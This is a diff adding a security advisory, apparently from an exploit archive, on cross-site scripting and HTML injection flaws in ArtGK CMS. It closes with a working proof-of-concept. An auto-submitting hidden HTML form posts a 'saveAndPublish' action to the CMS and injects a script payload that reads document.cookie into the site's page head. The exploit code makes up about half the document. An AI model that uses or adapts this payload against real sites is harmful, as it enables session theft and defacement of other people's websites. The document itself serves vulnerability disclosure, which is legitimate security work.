@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/42923/info
+
+ArtGK CMS is prone to a cross-site scripting vulnerability and an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible. 
+
+<form action="http://host/cms/action?async=exit" method="post" name="main" > <input type="hidden" name="_a[0][action]" value="saveAndPublish" /> <input type="hidden" name="_a[0][id]" value="1" /> <input type="hidden" name="_a[0][vars][title]" value="page title" /> <input type="hidden" name="_a[0][vars][description]" value="description" /> <input type="hidden" name="_a[0][vars][keywords]" value="metakeys" /> <input type="hidden" name="_a[0][vars][link]" value="/" /> <input type="hidden" name="_a[0][vars][use_content_in_head]" value="path" /> <input type="hidden" name="_a[0][vars][head]" value='<script type="text/javascript" src="/cms/js/ajax.js"> </script><meta name="keywords" content="keywords"/><meta name="description" content="Description"/><script>alert(document.cookie)</script><title>Site Title</title>' /> </form> <script> document.main.submit(); </script> 
